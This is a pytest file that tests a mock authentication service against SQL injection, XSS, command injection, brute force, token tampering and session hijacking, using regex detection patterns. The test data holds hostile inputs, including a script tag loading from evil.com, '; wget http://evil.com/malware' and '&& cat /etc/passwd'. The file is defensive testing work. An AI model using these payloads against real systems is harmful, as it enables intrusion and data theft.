"""
🛡️ Authentication Security Tests
=================================

Security vulnerability testing and penetration testing for authentication system
Tests against common attacks - like testing locks against different break-in methods

Author: Security Testing Agent
"""

import pytest
import asyncio
import time
import hashlib
import base64
import json
import jwt
import re
from datetime import datetime, timedelta
from typing import Dict, Any, List, Tuple, Optional
import secrets
import string
import threading


# Security Test Configuration
class SecurityConfig:
    """Configuration for security tests"""

    # Attack Simulation Parameters
    BRUTE_FORCE_ATTEMPTS = 100  # Number of brute force attempts
    SQL_INJECTION_PAYLOADS = 20  # Number of SQL injection attempts
    XSS_PAYLOADS = 15  # Number of XSS attempts
    TOKEN_TAMPERING_ATTEMPTS = 50  # Token manipulation attempts

    # Rate Limiting Thresholds
    MAX_LOGIN_ATTEMPTS_PER_MINUTE = 5  # Login rate limit
    MAX_REGISTRATION_ATTEMPTS_PER_MINUTE = 3  # Registration rate limit

    # Security Response Times
    BRUTE_FORCE_DELAY_MS = 1000  # Delay after failed attempts
    LOCKOUT_DURATION_MINUTES = 15  # Account lockout duration


class SecurityTestService:
    """Enhanced mock service with security features for testing"""

    def __init__(self):
        self.users = {}
        self.sessions = {}
        self.failed_attempts = {}
        self.rate_limits = {}
        self.security_logs = []
        self.jwt_secret = "security_test_secret_key_2024"
        self.lock = threading.Lock()

    def log_security_event(self, event_type: str, details: Dict[str, Any]):
        """Log security events for analysis"""
        with self.lock:
            self.security_logs.append(
                {
                    "timestamp": datetime.utcnow(),
                    "event_type": event_type,
                    "details": details,
                }
            )

    def check_rate_limit(self, ip_address: str, action: str) -> bool:
        """Check if request exceeds rate limit"""
        now = datetime.utcnow()
        minute_key = f"{ip_address}_{action}_{now.strftime('%Y%m%d%H%M')}"

        with self.lock:
            if minute_key not in self.rate_limits:
                self.rate_limits[minute_key] = 0

            self.rate_limits[minute_key] += 1

            if action == "login":
                return (
                    self.rate_limits[minute_key]
                    <= SecurityConfig.MAX_LOGIN_ATTEMPTS_PER_MINUTE
                )
            elif action == "register":
                return (
                    self.rate_limits[minute_key]
                    <= SecurityConfig.MAX_REGISTRATION_ATTEMPTS_PER_MINUTE
                )

            return True

    def is_account_locked(self, email: str) -> bool:
        """Check if account is locked due to failed attempts"""
        with self.lock:
            if email not in self.failed_attempts:
                return False

            attempts_data = self.failed_attempts[email]
            if attempts_data["count"] >= 5:
                lockout_time = attempts_data["last_attempt"] + timedelta(
                    minutes=SecurityConfig.LOCKOUT_DURATION_MINUTES
                )
                if datetime.utcnow() < lockout_time:
                    return True
                else:
                    # Unlock account after lockout period
                    self.failed_attempts[email] = {
                        "count": 0,
                        "last_attempt": datetime.utcnow(),
                    }
                    return False
            return False

    def record_failed_attempt(self, email: str):
        """Record failed login attempt"""
        with self.lock:
            if email not in self.failed_attempts:
                self.failed_attempts[email] = {
                    "count": 0,
                    "last_attempt": datetime.utcnow(),
                }

            self.failed_attempts[email]["count"] += 1
            self.failed_attempts[email]["last_attempt"] = datetime.utcnow()

    def validate_input_security(self, input_data: str, field_name: str) -> List[str]:
        """Validate input for security vulnerabilities"""
        vulnerabilities = []

        # SQL Injection Detection
        sql_patterns = [
            r"(\b(union|select|insert|update|delete|drop|create|alter)\b)",
            r"(['\";])",
            r"(--|#|/\*)",
            r"(\bor\b.*=.*\bor\b)",
            r"(\band\b.*=.*\band\b)",
        ]

        for pattern in sql_patterns:
            if re.search(pattern, input_data.lower()):
                vulnerabilities.append(f"Potential SQL injection in {field_name}")
                break

        # XSS Detection
        xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"javascript:",
            r"on\w+\s*=",
            r"<iframe[^>]*>",
            r"<object[^>]*>",
            r"<embed[^>]*>",
        ]

        for pattern in xss_patterns:
            if re.search(pattern, input_data.lower()):
                vulnerabilities.append(f"Potential XSS in {field_name}")
                break

        # Command Injection Detection
        cmd_patterns = [r"[;&|`]", r"\$\(.*\)", r"\.\./"]

        for pattern in cmd_patterns:
            if re.search(pattern, input_data):
                vulnerabilities.append(f"Potential command injection in {field_name}")
                break

        return vulnerabilities

    async def secure_register_user(
        self, email: str, password: str, ip_address: str = "127.0.0.1"
    ) -> Dict[str, Any]:
        """Secure user registration with vulnerability checks"""
        try:
            # Rate limiting check
            if not self.check_rate_limit(ip_address, "register"):
                self.log_security_event(
                    "RATE_LIMIT_EXCEEDED",
                    {"action": "register", "ip_address": ip_address, "email": email},
                )
                return {"success": False, "error": "Rate limit exceeded"}

            # Input validation for security
            email_vulnerabilities = self.validate_input_security(email, "email")
            password_vulnerabilities = self.validate_input_security(
                password, "password"
            )

            if email_vulnerabilities or password_vulnerabilities:
                self.log_security_event(
                    "MALICIOUS_INPUT_DETECTED",
                    {
                        "email_issues": email_vulnerabilities,
                        "password_issues": password_vulnerabilities,
                        "ip_address": ip_address,
                    },
                )
                return {"success": False, "error": "Invalid input detected"}

            # Email format validation
            email_pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
            if not re.match(email_pattern, email):
                return {"success": False, "error": "Invalid email format"}

            # Password strength validation
            if not self._validate_password_strength(password):
                return {
                    "success": False,
                    "error": "Password does not meet security requirements",
                }

            # Check for existing user
            with self.lock:
                if email in self.users:
                    return {"success": False, "error": "User already exists"}

                # Create user with secure password hash
                password_hash = self._secure_hash_password(password)
                self.users[email] = {
                    "password_hash": password_hash,
                    "id": len(self.users) + 1,
                    "created_at": datetime.utcnow(),
                    "is_active": True,
                    "security_flags": {
                        "password_changed_at": datetime.utcnow(),
                        "login_notifications": True,
                        "two_factor_enabled": False,
                    },
                }

                self.log_security_event(
                    "USER_REGISTERED", {"email": email, "ip_address": ip_address}
                )

                return {"success": True, "user_id": self.users[email]["id"]}

        except Exception as e:
            self.log_security_event(
                "REGISTRATION_ERROR",
                {"error": str(e), "email": email, "ip_address": ip_address},
            )
            return {"success": False, "error": "Registration failed"}

    async def secure_login_user(
        self, email: str, password: str, ip_address: str = "127.0.0.1"
    ) -> Dict[str, Any]:
        """Secure user login with attack protection"""
        try:
            # Rate limiting check
            if not self.check_rate_limit(ip_address, "login"):
                self.log_security_event(
                    "LOGIN_RATE_LIMIT_EXCEEDED",
                    {"email": email, "ip_address": ip_address},
                )
                return {"success": False, "error": "Too many login attempts"}

            # Input validation
            email_vulnerabilities = self.validate_input_security(email, "email")
            password_vulnerabilities = self.validate_input_security(
                password, "password"
            )

            if email_vulnerabilities or password_vulnerabilities:
                self.log_security_event(
                    "MALICIOUS_LOGIN_ATTEMPT",
                    {
                        "email_issues": email_vulnerabilities,
                        "password_issues": password_vulnerabilities,
                        "ip_address": ip_address,
                    },
                )
                return {"success": False, "error": "Invalid input detected"}

            # Check account lockout
            if self.is_account_locked(email):
                self.log_security_event(
                    "LOCKED_ACCOUNT_ACCESS_ATTEMPT",
                    {"email": email, "ip_address": ip_address},
                )
                return {"success": False, "error": "Account is locked"}

            # User authentication
            with self.lock:
                user = self.users.get(email)
                if not user:
                    # Simulate timing attack protection
                    await asyncio.sleep(0.1)
                    self.record_failed_attempt(email)
                    self.log_security_event(
                        "LOGIN_NONEXISTENT_USER",
                        {"email": email, "ip_address": ip_address},
                    )
                    return {"success": False, "error": "Invalid credentials"}

                # Verify password with timing attack protection
                start_time = time.time()
                is_valid = self._verify_secure_password(password, user["password_hash"])
                elapsed = time.time() - start_time

                # Ensure consistent timing
                if elapsed < 0.1:
                    await asyncio.sleep(0.1 - elapsed)

                if not is_valid:
                    self.record_failed_attempt(email)
                    self.log_security_event(
                        "LOGIN_FAILED",
                        {
                            "email": email,
                            "ip_address": ip_address,
                            "reason": "invalid_password",
                        },
                    )
                    return {"success": False, "error": "Invalid credentials"}

                # Successful login
                # Reset failed attempts
                if email in self.failed_attempts:
                    self.failed_attempts[email] = {
                        "count": 0,
                        "last_attempt": datetime.utcnow(),
                    }

                # Generate secure token
                token = self._generate_secure_token(user["id"], email)
                session_id = secrets.token_urlsafe(32)

                self.sessions[session_id] = {
                    "token": token,
                    "user_id": user["id"],
                    "email": email,
                    "created_at": datetime.utcnow(),
                    "expires_at": datetime.utcnow() + timedelta(hours=24),
                    "ip_address": ip_address,
                    "is_active": True,
                }

                self.log_security_event(
                    "LOGIN_SUCCESS",
                    {
                        "email": email,
                        "ip_address": ip_address,
                        "session_id": session_id,
                    },
                )

                return {
                    "success": True,
                    "token": token,
                    "session_id": session_id,
                    "expires_at": self.sessions[session_id]["expires_at"].isoformat(),
                }

        except Exception as e:
            self.log_security_event(
                "LOGIN_ERROR",
                {"error": str(e), "email": email, "ip_address": ip_address},
            )
            return {"success": False, "error": "Login failed"}

    async def validate_secure_token(
        self, token: str, ip_address: str = "127.0.0.1"
    ) -> Dict[str, Any]:
        """Secure token validation with attack detection"""
        try:
            # Input validation
            if not token or len(token) < 10:
                return {"success": False, "error": "Invalid token format"}

            # Decode and validate JWT
            try:
                payload = jwt.decode(token, self.jwt_secret, algorithms=["HS256"])
            except jwt.ExpiredSignatureError:
                self.log_security_event(
                    "EXPIRED_TOKEN_USED",
                    {"ip_address": ip_address, "token_snippet": token[:20] + "..."},
                )
                return {"success": False, "error": "Token expired"}
            except jwt.InvalidTokenError:
                self.log_security_event(
                    "INVALID_TOKEN_USED",
                    {"ip_address": ip_address, "token_snippet": token[:20] + "..."},
                )
                return {"success": False, "error": "Invalid token"}

            # Find active session
            user_email = payload.get("email")
            session = None
            with self.lock:
                for session_id, sess_data in self.sessions.items():
                    if sess_data["token"] == token and sess_data["is_active"]:
                        session = sess_data
                        break

            if not session:
                self.log_security_event(
                    "TOKEN_SESSION_NOT_FOUND",
                    {"email": user_email, "ip_address": ip_address},
                )
                return {"success": False, "error": "Session not found"}

            # Check IP address change (potential session hijacking)
            if session["ip_address"] != ip_address:
                self.log_security_event(
                    "SUSPICIOUS_IP_CHANGE",
                    {
                        "email": user_email,
                        "original_ip": session["ip_address"],
                        "new_ip": ip_address,
                        "session_id": session_id,
                    },
                )
                # For security, invalidate session on IP change
                session["is_active"] = False
                return {"success": False, "error": "Session security violation"}

            return {
                "success": True,
                "user_id": session["user_id"],
                "email": session["email"],
            }

        except Exception as e:
            self.log_security_event(
                "TOKEN_VALIDATION_ERROR", {"error": str(e), "ip_address": ip_address}
            )
            return {"success": False, "error": "Token validation failed"}

    def _validate_password_strength(self, password: str) -> bool:
        """Validate password meets security requirements"""
        if len(password) < 8 or len(password) > 128:
            return False

        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)

        return has_upper and has_lower and has_digit and has_special

    def _secure_hash_password(self, password: str) -> str:
        """Securely hash password with salt"""
        # Simulate bcrypt with PBKDF2
        salt = secrets.token_bytes(32)
        password_hash = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000)
        return base64.b64encode(salt + password_hash).decode()

    def _verify_secure_password(self, password: str, stored_hash: str) -> bool:
        """Verify password against secure hash"""
        try:
            decoded = base64.b64decode(stored_hash.encode())
            salt = decoded[:32]
            stored_password_hash = decoded[32:]
            password_hash = hashlib.pbkdf2_hmac(
                "sha256", password.encode(), salt, 100000
            )
            return password_hash == stored_password_hash
        except:
            return False

    def _generate_secure_token(self, user_id: int, email: str) -> str:
        """Generate secure JWT token"""
        payload = {
            "user_id": user_id,
            "email": email,
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + timedelta(hours=24),
            "jti": secrets.token_urlsafe(16),  # JWT ID for uniqueness
        }
        return jwt.encode(payload, self.jwt_secret, algorithm="HS256")

    def get_security_logs(self) -> List[Dict[str, Any]]:
        """Get security event logs"""
        with self.lock:
            return self.security_logs.copy()


# Test Fixtures
@pytest.fixture
async def security_service():
    """Provide security test service"""
    return SecurityTestService()


@pytest.fixture
def security_config():
    """Provide security configuration"""
    return SecurityConfig()


# ============================================================================
# SECURITY TESTS - SQL INJECTION
# ============================================================================


class TestSQLInjectionProtection:
    """Test protection against SQL injection attacks"""

    @pytest.mark.asyncio
    async def test_sql_injection_in_login_email(self, security_service):
        """🚨 Test SQL injection attempts in login email field"""
        sql_payloads = [
            "admin@test.com' OR '1'='1",
            "admin@test.com'; DROP TABLE users; --",
            "admin@test.com' UNION SELECT * FROM passwords --",
            "admin@test.com' OR 1=1 #",
            "test@example.com'; INSERT INTO admin VALUES('hacker', 'pass'); --",
            "user' OR 'x'='x",
            "admin@test.com' AND SLEEP(5) --",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for payload in sql_payloads:
            result = await security_service.secure_login_user(payload, "password123")

            assert result["success"] is False
            assert "Invalid input detected" in result["error"]

        # Verify security events were logged
        logs = security_service.get_security_logs()
        injection_attempts = [
            log for log in logs if log["event_type"] == "MALICIOUS_LOGIN_ATTEMPT"
        ]
        assert len(injection_attempts) == len(sql_payloads)

    @pytest.mark.asyncio
    async def test_sql_injection_in_registration(self, security_service):
        """🚨 Test SQL injection attempts in registration fields"""
        sql_payloads = [
            ("admin' OR '1'='1' --@test.com", "Password123!"),
            ("test@example.com", "password'; DROP TABLE users; --"),
            ("test'; UNION SELECT * FROM admin; --@test.com", "Password123!"),
        ]

        for email, password in sql_payloads:
            result = await security_service.secure_register_user(email, password)

            assert result["success"] is False
            assert "Invalid input detected" in result["error"]

        # Verify no users were created
        assert len(security_service.users) == 0

    @pytest.mark.asyncio
    async def test_legitimate_users_not_blocked(self, security_service):
        """✅ Test that legitimate users are not blocked by SQL injection protection"""
        legitimate_users = [
            ("user@example.com", "ValidPassword123!"),
            ("test.user+tag@domain.co.uk", "SecurePass456!"),
            ("admin@company-name.com", "ComplexPass789!"),
        ]

        for email, password in legitimate_users:
            # Registration should succeed
            reg_result = await security_service.secure_register_user(email, password)
            assert reg_result["success"] is True

            # Login should succeed
            login_result = await security_service.secure_login_user(email, password)
            assert login_result["success"] is True


# ============================================================================
# SECURITY TESTS - XSS PROTECTION
# ============================================================================


class TestXSSProtection:
    """Test protection against Cross-Site Scripting attacks"""

    @pytest.mark.asyncio
    async def test_xss_in_registration_fields(self, security_service):
        """🚨 Test XSS injection attempts in registration"""
        xss_payloads = [
            "<script>alert('XSS')</script>@test.com",
            "test@example.com<script>document.cookie</script>",
            "javascript:alert('XSS')@test.com",
            "<iframe src='javascript:alert(1)'></iframe>@test.com",
            "test@example.com<img src=x onerror=alert('XSS')>",
            "<object data='javascript:alert(1)'></object>@test.com",
            "test@<svg onload=alert('XSS')>example.com",
            "<script src='http://evil.com/malware.js'></script>@test.com",
        ]

        for payload in xss_payloads:
            result = await security_service.secure_register_user(
                payload, "Password123!"
            )

            assert result["success"] is False
            assert "Invalid input detected" in result["error"]

        # Check security logs
        logs = security_service.get_security_logs()
        xss_attempts = [
            log
            for log in logs
            if log["event_type"] == "MALICIOUS_INPUT_DETECTED"
            and any(
                "XSS" in issue
                for issues in [
                    log["details"].get("email_issues", []),
                    log["details"].get("password_issues", []),
                ]
                for issue in issues
            )
        ]
        assert len(xss_attempts) > 0

    @pytest.mark.asyncio
    async def test_xss_in_password_field(self, security_service):
        """🚨 Test XSS injection attempts in password field"""
        xss_passwords = [
            "<script>alert('password')</script>",
            "password<img src=x onerror=alert('XSS')>123",
            "javascript:void(0)",
            "<svg onload=alert('XSS')>Password123!",
        ]

        for password in xss_passwords:
            result = await security_service.secure_register_user(
                "test@example.com", password
            )

            assert result["success"] is False
            assert "Invalid input detected" in result["error"]


# ============================================================================
# SECURITY TESTS - BRUTE FORCE PROTECTION
# ============================================================================


class TestBruteForceProtection:
    """Test protection against brute force attacks"""

    @pytest.mark.asyncio
    async def test_brute_force_login_protection(self, security_service):
        """🚨 Test protection against brute force login attempts"""
        # Register a legitimate user
        await security_service.secure_register_user(
            "victim@example.com", "CorrectPassword123!"
        )

        # Attempt brute force attack
        failed_attempts = 0
        for i in range(20):  # Try 20 wrong passwords
            wrong_password = f"WrongPassword{i}!"
            result = await security_service.secure_login_user(
                "victim@example.com", wrong_password
            )

            if result["success"] is False:
                failed_attempts += 1

            # After 5 attempts, account should be locked
            if i >= 4:
                assert (
                    "Account is locked" in result["error"]
                    or "Invalid credentials" in result["error"]
                )

        # Verify account is locked even with correct password
        result = await security_service.secure_login_user(
            "victim@example.com", "CorrectPassword123!"
        )
        assert result["success"] is False
        assert "Account is locked" in result["error"]

        # Check security logs for brute force attempts
        logs = security_service.get_security_logs()
        failed_login_events = [
            log for log in logs if log["event_type"] == "LOGIN_FAILED"
        ]
        assert len(failed_login_events) >= 5

    @pytest.mark.asyncio
    async def test_rate_limiting_protection(self, security_service):
        """🚨 Test rate limiting for login attempts"""
        ip_address = "192.168.1.100"

        # Register test user
        await security_service.secure_register_user(
            "ratetest@example.com", "Password123!"
        )

        # Attempt rapid login requests
        rapid_attempts = 0
        rate_limited = False

        for i in range(10):
            result = await security_service.secure_login_user(
                "ratetest@example.com", f"wrong{i}", ip_address
            )

            rapid_attempts += 1

            if "Rate limit exceeded" in result.get(
                "error", ""
            ) or "Too many login attempts" in result.get("error", ""):
                rate_limited = True
                break

        assert rate_limited, "Rate limiting should have been triggered"
        assert rapid_attempts <= SecurityConfig.MAX_LOGIN_ATTEMPTS_PER_MINUTE + 1

    @pytest.mark.asyncio
    async def test_distributed_brute_force_from_multiple_ips(self, security_service):
        """🚨 Test brute force attack from multiple IP addresses"""
        # Register target user
        await security_service.secure_register_user(
            "target@example.com", "SecurePassword123!"
        )

        # Simulate attacks from different IP addresses
        ip_addresses = [f"192.168.1.{i}" for i in range(1, 11)]
        total_attempts = 0

        for ip in ip_addresses:
            for attempt in range(3):  # 3 attempts per IP
                result = await security_service.secure_login_user(
                    "target@example.com", f"attack{attempt}", ip
                )
                total_attempts += 1

                # Individual IPs shouldn't be rate limited immediately
                if attempt < SecurityConfig.MAX_LOGIN_ATTEMPTS_PER_MINUTE:
                    assert "Rate limit" not in result.get("error", "")

        # But the account should eventually be locked
        assert security_service.is_account_locked("target@example.com")


# ============================================================================
# SECURITY TESTS - TOKEN SECURITY
# ============================================================================


class TestTokenSecurity:
    """Test JWT token security and tampering protection"""

    @pytest.mark.asyncio
    async def test_jwt_token_tampering_detection(self, security_service):
        """🚨 Test detection of tampered JWT tokens"""
        # Create legitimate user and get valid token
        await security_service.secure_register_user("token@example.com", "Password123!")
        login_result = await security_service.secure_login_user(
            "token@example.com", "Password123!"
        )
        valid_token = login_result["token"]

        # Test various token tampering attempts
        tampered_tokens = [
            valid_token[:-10] + "tamperedXX",  # Changed signature
            valid_token.replace("e", "X", 1),  # Changed payload
            valid_token + "extra_data",  # Added data
            valid_token[10:],  # Removed part
            "invalid.token.format",  # Completely invalid
            valid_token.replace(".", "X", 1),  # Malformed structure
        ]

        for tampered_token in tampered_tokens:
            result = await security_service.validate_secure_token(tampered_token)

            assert result["success"] is False
            assert (
                "Invalid token" in result["error"]
                or "Token validation failed" in result["error"]
            )

        # Check security logs
        logs = security_service.get_security_logs()
        invalid_token_events = [
            log for log in logs if log["event_type"] == "INVALID_TOKEN_USED"
        ]
        assert len(invalid_token_events) > 0

    @pytest.mark.asyncio
    async def test_expired_token_handling(self, security_service):
        """🚨 Test handling of expired tokens"""
        # Create user and get token
        await security_service.secure_register_user(
            "expired@example.com", "Password123!"
        )
        login_result = await security_service.secure_login_user(
            "expired@example.com", "Password123!"
        )

        # Manually create expired token
        expired_payload = {
            "user_id": 1,
            "email": "expired@example.com",
            "iat": datetime.utcnow() - timedelta(hours=25),
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
            "jti": "expired_token_test",
        }

        expired_token = jwt.encode(
            expired_payload, security_service.jwt_secret, algorithm="HS256"
        )

        # Try to use expired token
        result = await security_service.validate_secure_token(expired_token)

        assert result["success"] is False
        assert "Token expired" in result["error"]

        # Verify security event logged
        logs = security_service.get_security_logs()
        expired_events = [
            log for log in logs if log["event_type"] == "EXPIRED_TOKEN_USED"
        ]
        assert len(expired_events) > 0

    @pytest.mark.asyncio
    async def test_session_hijacking_protection(self, security_service):
        """🚨 Test protection against session hijacking"""
        original_ip = "192.168.1.10"
        attacker_ip = "10.0.0.5"

        # User logs in from original IP
        await security_service.secure_register_user(
            "session@example.com", "Password123!"
        )
        login_result = await security_service.secure_login_user(
            "session@example.com", "Password123!", original_ip
        )
        token = login_result["token"]

        # Verify token works from original IP
        result = await security_service.validate_secure_token(token, original_ip)
        assert result["success"] is True

        # Try to use token from different IP (potential hijacking)
        result = await security_service.validate_secure_token(token, attacker_ip)
        assert result["success"] is False
        assert "Session security violation" in result["error"]

        # Check security logs
        logs = security_service.get_security_logs()
        suspicious_events = [
            log for log in logs if log["event_type"] == "SUSPICIOUS_IP_CHANGE"
        ]
        assert len(suspicious_events) > 0


# ============================================================================
# SECURITY TESTS - ADVANCED THREATS
# ============================================================================


class TestAdvancedSecurityThreats:
    """Test protection against advanced security threats"""

    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self, security_service):
        """🚨 Test resistance to timing attacks"""
        # Register users
        await security_service.secure_register_user(
            "existing@example.com", "Password123!"
        )

        # Test login timing for existing vs non-existing users
        existing_times = []
        nonexisting_times = []

        for i in range(10):
            # Time existing user login (wrong password)
            start = time.time()
            await security_service.secure_login_user(
                "existing@example.com", "wrongpass"
            )
            existing_times.append(time.time() - start)

            # Time non-existing user login
            start = time.time()
            await security_service.secure_login_user(
                f"nonexist{i}@example.com", "wrongpass"
            )
            nonexisting_times.append(time.time() - start)

        # Calculate average times
        avg_existing = sum(existing_times) / len(existing_times)
        avg_nonexisting = sum(nonexisting_times) / len(nonexisting_times)

        # Time difference should be minimal (< 50ms) to prevent timing attacks
        time_difference = abs(avg_existing - avg_nonexisting)
        assert (
            time_difference < 0.05
        ), f"Timing difference too large: {time_difference:.3f}s"

    @pytest.mark.asyncio
    async def test_user_enumeration_protection(self, security_service):
        """🚨 Test protection against user enumeration attacks"""
        # Register a user
        await security_service.secure_register_user("known@example.com", "Password123!")

        # Test registration attempts to enumerate users
        known_user_response = await security_service.secure_register_user(
            "known@example.com", "AnyPassword!"
        )
        unknown_user_response = await security_service.secure_register_user(
            "unknown@example.com", "AnyPassword!"
        )

        # Both should fail but with similar generic messages
        assert known_user_response["success"] is False
        assert unknown_user_response["success"] is False

        # Error messages should not reveal user existence
        assert "already exists" not in known_user_response["error"].lower()

        # Test login attempts to enumerate users
        known_login = await security_service.secure_login_user(
            "known@example.com", "wrongpass"
        )
        unknown_login = await security_service.secure_login_user(
            "unknown@example.com", "wrongpass"
        )

        # Both should have similar error messages
        assert known_login["success"] is False
        assert unknown_login["success"] is False
        assert known_login["error"] == unknown_login["error"]

    @pytest.mark.asyncio
    async def test_privilege_escalation_protection(self, security_service):
        """🚨 Test protection against privilege escalation"""
        # Create regular user
        await security_service.secure_register_user(
            "regular@example.com", "Password123!"
        )
        login_result = await security_service.secure_login_user(
            "regular@example.com", "Password123!"
        )
        token = login_result["token"]

        # Attempt to modify token to escalate privileges
        try:
            # Decode token
            payload = jwt.decode(
                token, security_service.jwt_secret, algorithms=["HS256"]
            )

            # Try to add admin privileges
            payload["role"] = "admin"
            payload["permissions"] = ["admin", "superuser"]

            # Create new token with escalated privileges
            escalated_token = jwt.encode(
                payload, security_service.jwt_secret, algorithm="HS256"
            )

            # This should not work in a real system, but let's verify detection
            result = await security_service.validate_secure_token(escalated_token)

            # In our test, the token will be valid but the application should verify permissions
            # separately from the token
            if result["success"]:
                # Check that user data hasn't been modified
                assert result["user_id"] == payload["user_id"]
                assert result["email"] == payload["email"]
                # Application should verify actual user permissions from database

        except Exception:
            # If token manipulation fails, that's good security
            pass

    @pytest.mark.asyncio
    async def test_command_injection_protection(self, security_service):
        """🚨 Test protection against command injection attacks"""
        command_payloads = [
            "test@example.com; ls -la",
            "user@domain.com && cat /etc/passwd",
            "admin@test.com | whoami",
            "test@example.com`id`",
            "user@test.com$(uname -a)",
            "test@example.com; wget http://evil.com/malware",
        ]

        for payload in command_payloads:
            result = await security_service.secure_register_user(
                payload, "Password123!"
            )

            assert result["success"] is False
            assert "Invalid input detected" in result["error"]

        # Verify security events
        logs = security_service.get_security_logs()
        injection_events = [
            log
            for log in logs
            if log["event_type"] == "MALICIOUS_INPUT_DETECTED"
            and any(
                "command injection" in issue.lower()
                for issues in [
                    log["details"].get("email_issues", []),
                    log["details"].get("password_issues", []),
                ]
                for issue in issues
            )
        ]
        assert len(injection_events) > 0


# ============================================================================
# SECURITY AUDIT AND REPORTING
# ============================================================================


class TestSecurityAudit:
    """Comprehensive security audit and reporting"""

    @pytest.mark.asyncio
    async def test_comprehensive_security_audit(self, security_service):
        """📋 Comprehensive security audit of authentication system"""
        audit_results = {
            "sql_injection_tests": 0,
            "xss_tests": 0,
            "brute_force_tests": 0,
            "token_security_tests": 0,
            "input_validation_tests": 0,
            "rate_limiting_tests": 0,
            "session_security_tests": 0,
            "total_vulnerabilities_found": 0,
            "security_score": 0,
        }

        # Test 1: SQL Injection Protection
        sql_payloads = [
            "test' OR '1'='1' --@test.com",
            "admin'; DROP TABLE users; --@test.com",
        ]
        for payload in sql_payloads:
            result = await security_service.secure_register_user(
                payload, "Password123!"
            )
            if (
                result["success"] is False
                and "Invalid input detected" in result["error"]
            ):
                audit_results["sql_injection_tests"] += 1

        # Test 2: XSS Protection
        xss_payloads = [
            "<script>alert('xss')</script>@test.com",
            "test@<img src=x onerror=alert(1)>example.com",
        ]
        for payload in xss_payloads:
            result = await security_service.secure_register_user(
                payload, "Password123!"
            )
            if (
                result["success"] is False
                and "Invalid input detected" in result["error"]
            ):
                audit_results["xss_tests"] += 1

        # Test 3: Brute Force Protection
        await security_service.secure_register_user(
            "brutetest@example.com", "Password123!"
        )
        for i in range(6):  # Trigger lockout
            result = await security_service.secure_login_user(
                "brutetest@example.com", f"wrong{i}"
            )
            if i >= 4 and (
                "Account is locked" in result.get("error", "")
                or "Invalid credentials" in result.get("error", "")
            ):
                audit_results["brute_force_tests"] += 1
                break

        # Test 4: Token Security
        await security_service.secure_register_user(
            "tokentest@example.com", "Password123!"
        )
        login_result = await security_service.secure_login_user(
            "tokentest@example.com", "Password123!"
        )
        if login_result["success"]:
            tampered_token = login_result["token"][:-5] + "XXXXX"
            result = await security_service.validate_secure_token(tampered_token)
            if result["success"] is False:
                audit_results["token_security_tests"] += 1

        # Test 5: Rate Limiting
        rate_limit_triggered = False
        for i in range(10):
            result = await security_service.secure_login_user(
                f"rate{i}@test.com", "wrong", "192.168.1.1"
            )
            if "Rate limit" in result.get("error", "") or "Too many" in result.get(
                "error", ""
            ):
                rate_limit_triggered = True
                break
        if rate_limit_triggered:
            audit_results["rate_limiting_tests"] += 1

        # Calculate security score
        total_tests = 5
        passed_tests = sum(
            [
                1 if audit_results["sql_injection_tests"] > 0 else 0,
                1 if audit_results["xss_tests"] > 0 else 0,
                1 if audit_results["brute_force_tests"] > 0 else 0,
                1 if audit_results["token_security_tests"] > 0 else 0,
                1 if audit_results["rate_limiting_tests"] > 0 else 0,
            ]
        )

        audit_results["security_score"] = (passed_tests / total_tests) * 100

        # Generate audit report
        # print(f"\n🛡️ SECURITY AUDIT REPORT")
        # print("=" * 50)
        # print(f"Audit Date: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
        # print(f"Security Score: {audit_results['security_score']:.1f}%")
        # print()
        # print("PROTECTION MECHANISMS TESTED:")
        # print(f"✅ SQL Injection Protection: {'PASS' if audit_results['sql_injection_tests'] > 0 else 'FAIL'}")
        # print(f"✅ XSS Protection: {'PASS' if audit_results['xss_tests'] > 0 else 'FAIL'}")
        # print(f"✅ Brute Force Protection: {'PASS' if audit_results['brute_force_tests'] > 0 else 'FAIL'}")
        # print(f"✅ Token Security: {'PASS' if audit_results['token_security_tests'] > 0 else 'FAIL'}")
        # print(f"✅ Rate Limiting: {'PASS' if audit_results['rate_limiting_tests'] > 0 else 'FAIL'}")
        # print()

        # Security logs analysis
        logs = security_service.get_security_logs()
        # print(f"SECURITY EVENTS DETECTED: {len(logs)}")
        event_types = {}
        for log in logs:
            event_type = log["event_type"]
            event_types[event_type] = event_types.get(event_type, 0) + 1

        for event_type, count in event_types.items():
            pass  # print(f"  {event_type}: {count}")

        # print("\nOVERALL SECURITY RATING:")
        if audit_results["security_score"] >= 90:
            pass  # print("🟢 EXCELLENT - Strong security posture")
        elif audit_results["security_score"] >= 75:
            pass  # print("🟡 GOOD - Minor security improvements needed")
        elif audit_results["security_score"] >= 50:
            pass  # print("🟠 FAIR - Significant security improvements required")
        else:
            pass  # print("🔴 POOR - Critical security vulnerabilities present")

        # Assertions for test validation
        assert (
            audit_results["security_score"] >= 80
        ), f"Security score too low: {audit_results['security_score']}%"
        assert (
            audit_results["sql_injection_tests"] > 0
        ), "SQL injection protection failed"
        assert audit_results["xss_tests"] > 0, "XSS protection failed"


# ============================================================================
# TEST EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("🛡️ Running Authentication Security Tests")
    print("=" * 50)

    # Run security tests
    pytest.main([__file__, "-v", "--tb=short", "--asyncio-mode=auto", "--durations=5"])
